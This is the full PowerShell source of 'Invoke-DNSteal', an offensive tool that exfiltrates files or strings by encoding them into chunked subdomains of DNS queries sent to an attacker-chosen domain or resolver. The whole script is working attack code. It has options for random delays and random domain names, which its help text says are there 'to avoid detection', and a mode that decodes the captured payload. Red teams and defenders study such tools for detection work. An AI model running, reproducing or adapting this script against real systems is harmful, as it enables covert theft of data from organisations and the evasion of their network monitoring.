#================================#
#  Invoke-DNSteal by @JoelGMSec  #
#      https://darkbyte.net      #
#================================#

# Design
$ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.BackgroundColor = 'Black'
$Host.UI.RawUI.ForegroundColor = 'White'

# Parameters
$Target=$args[1]
$Payload=$args[3]
$DomainLength=$args[5]
$Server=$args[7]
$TcpOnly=$args[9]
$DelayMin=$args[11]
$DelayMax=$args[13]
$Random=$args[14] 

# Banner
function Show-Banner {
Write-Host
Write-Host "  ___                 _              ____  _   _ ____  _             _  " -ForeGroundColor Blue
Write-Host " |_ _|_ __ _   __ __ | | __ __      |  _ \| \ | / ___|| |__ __  __ _| | " -ForeGroundColor Blue
Write-Host "  | || '_ \ \ / / _ \| |/ / _ \_____| | | |  \| \___ \| __/ _ \/ _' | | " -ForeGroundColor Blue
Write-Host "  | || | | \ V / (_) |   <  __/_____| |_| | |\  |___) | ||  __/ (_| | | " -ForeGroundColor Blue
Write-Host " |___|_| |_|\_/ \___/|_|\_\___|     |____/|_| \_|____/ \__\___|\__,_|_| " -ForeGroundColor Blue
Write-Host
Write-Host "  --------------------------- by @JoelGMSec --------------------------  " -ForeGroundColor Green
Write-Host }

# Help
function Show-Help {
Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to exfiltrate data through DNS protocol"
Write-Host "        and lets you control the size of queries using random delay"
Write-Host
Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\Invoke-DNSteal.ps1 -t target -p payload -l lenght" -ForegroundColor Blue 
Write-Host "         -s server -tcponly true/false -min 3000 -max 5000" -ForegroundColor Blue ; Write-Host ; Write-Host " Parameters: " -ForegroundColor Yellow 
Write-Host "       · " -NoNewLine ; Write-Host "Target:      "-ForegroundColor Green -NoNewLine ; Write-Host "Domain target to exfiltrate data"
Write-Host "       · " -NoNewLine ; Write-Host "Payload:     "-ForegroundColor Green -NoNewLine ; Write-Host "Payload to send over DNS chunks"
Write-Host "       · " -NoNewLine ; Write-Host "Lenght:      "-ForegroundColor Green -NoNewLine ; Write-Host "Lenght of payload to control data size"
Write-Host "       · " -NoNewLine ; Write-Host "Server:      "-ForegroundColor Green -NoNewLine ; Write-Host "Custom server to resolve DNS queries"
Write-Host "       · " -NoNewLine ; Write-Host "TcpOnly:     "-ForegroundColor Green -NoNewLine ; Write-Host "Set TcpOnly to true or false "
Write-Host "       · " -NoNewLine ; Write-Host "Delay Min:   "-ForegroundColor Green -NoNewLine ; Write-Host "Min delay time to do a query in ms"
Write-Host "       · " -NoNewLine ; Write-Host "Delay Max:   "-ForegroundColor Green -NoNewLine ; Write-Host "Max delay time to do a query in ms"
Write-Host "       · " -NoNewLine ; Write-Host "Random:      "-ForegroundColor Green -NoNewLine ; Write-Host "Use random domain name to avoid detection"
Write-Host
Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "The lenght (payload size) must be between 4 and 240"
Write-Host "         " -NoNewLine ; Write-Host " The process time will increase depending on data size" ; Write-Host }

# Errors
if ($args[0] -like "-d*") { Show-Banner } else {
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[5] -eq $null) { $DomainLength = 24 } else {
if ($args[5] -lt 4) { Show-Banner ; Show-Help ; Write-Host "[!] Domain lenght is too short!" -ForegroundColor Red ; Write-Host ; break }}
if ($args[5] -gt 240) { Show-Banner ; Show-Help ; Write-Host "[!] Domain lenght is too long!" -ForegroundColor Red ; Write-Host ; break }

# Filters
filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) }} 
filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } ; $SubdomainLength = 32 ; $Base=0 ; $script:base = $Base

# Data Input 
if ($Payload -like "$pwd*") { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) } 
$Extension = $Payload.Split('.')[1] ; $Payload = $b64Payload

# Display Info
function Show-Info {
$Date = Get-Date -Format "dd/MM/yyyy - HH:mm"
if (!$DelayMin) { $DelayMin = 0 } ; if (!$DelayMax) { $DelayMax = 0 }

# Bytes & Chunks
$Chunks = ($Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength).count + 2 ; $ByteSize = 'bytes'
$Bytes = (($Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength) | measure -Character).Characters
if ($Bytes -ge 1024) { $Bytes = $Bytes / 1024 ; $ByteSize = 'KB'} ; if ($Bytes -ge 1024) { $Bytes = $Bytes / 1024 ; $ByteSize = 'MB' }
if ($Bytes -ge 1024) { $Bytes = $Bytes / 1024 ; $ByteSize = 'GB'} ; $Bytes = [math]::Round($Bytes,2)
if ($TcpOnly -in 'True') { $Protocol = 'TCP' } else { $Protocol = 'UDP' }

$MaxChunk = $Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | Select -First 2 | Select -Last 1
$MaxQuery = "$chunks.$query.$Target" ; if ($MaxQuery.Length -ge 80) { Show-Banner ; Show-Help
Write-Host "[!] Domain lenght is too long!" -ForegroundColor Red ; Write-Host ; break } else {
Write-Host "[i] Sending $Bytes $ByteSize in $Chunks chunks over $Protocol on $Date" -ForegroundColor Blue ; Write-Host

# Transmission Time
if ($DelayMax -eq 0) { if ($DelayMin -ne 0) { $Time = ($Chunks -2) * ($DelayMin / 1000) } else {
if ($DelayMin -eq 0) { $DelayMin = 0.1 ; $Time = ($Chunks -2) * ($DelayMin) }} ; $Seconds = 'sec'
if ($Time -ge 60) { $Time = $Time / 60 ; $Seconds = 'min'} ; if ($Time -ge 60) { $Time = $Time / 60 ; $Seconds = 'h'}
if ($Seconds -eq 'h') { if ($Time -ge 24) { $Time = $Time / 24 ; $Seconds = 'd'}} ; $Time = [math]::Round($Time,1)
Write-Host "[i] Estimated transmission time is $Time $Seconds in best conditions" -ForegroundColor Blue }

if ($DelayMax -ne 0) { $TimeMin = ($Chunks -2) * ($DelayMin / 1000) ; $TimeMax = ($Chunks -2) * ($DelayMax / 1000) ; $SecondsMin = 'sec'
if ($TimeMin -ge 60) { $TimeMin = $TimeMin / 60 ; $SecondsMin = 'min'} ; if ($TimeMin -ge 60) { $TimeMin = $TimeMin / 60 ; $SecondsMin = 'h' }
if ($Seconds -eq 'h') { if ($TimeMin -ge 24) { $Time = $Time / 24 ; $Seconds = 'd'}} ; $TimeMin = [math]::Round($TimeMin,1) ; $SecondsMax = 'sec'
if ($TimeMax -ge 60) { $TimeMax = $TimeMax / 60 ; $SecondsMax = 'min'} ; if ($TimeMax -ge 60) { $TimeMax = $TimeMax / 60 ; $SecondsMax = 'h' }
if ($Seconds -eq 'h') { if ($TimeMax -ge 24) { $Time = $Time / 24 ; $Seconds = 'd'}} ; $TimeMax = [math]::Round($TimeMax,1)
Write-Host "[i] Estimated transmission time is between $TimeMin $SecondsMin and $TimeMax $SecondsMax in best conditions" -ForegroundColor Blue }}}

# DNS Query
function DnsQuery($domain) {
$RandTarget1 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_}))
$RandTarget2 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_}))
$RandTarget3 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_})) ; if ($Random) {
if (!$Server) { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
else { Resolve-DnsName -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}
else { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
else { Resolve-DnsName -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}}

else { if (!$Server) { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }
else { Resolve-DnsName -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }}
else { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }
else { Resolve-DnsName -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$($Target|Get-Random)" | Select -First 1 }}}}

# Main Function
Show-Banner ; Show-Info 
if ($extension) { DnsQuery "$extension.start" } else { DnsQuery "start" }
$Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % { if ($DelayMin -lt $DelayMax) { 
Start-Sleep -Milliseconds (Get-Random -Minimum $DelayMin -Maximum $DelayMax) } else { if ($DelayMin -gt 0) {
Start-Sleep -Milliseconds $DelayMin }} DnsQuery $_ }
if ($extension) { DnsQuery "$extension.end" } else { DnsQuery "end" }
Write-Host ; Write-Host "[+] Done!" -NoNewLine -ForegroundColor Green }

# Decode Function
if($args[0] -like "-d*"){
$args[1] -Split '(.{2})' | %{ if ($_ -ne "") { $HexData+=[CHAR]([CONVERT]::toint16($_,16))}}
Write-Host "Payload: " -NoNewLine -ForegroundColor Yellow
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($HexData)) ; Write-Host }
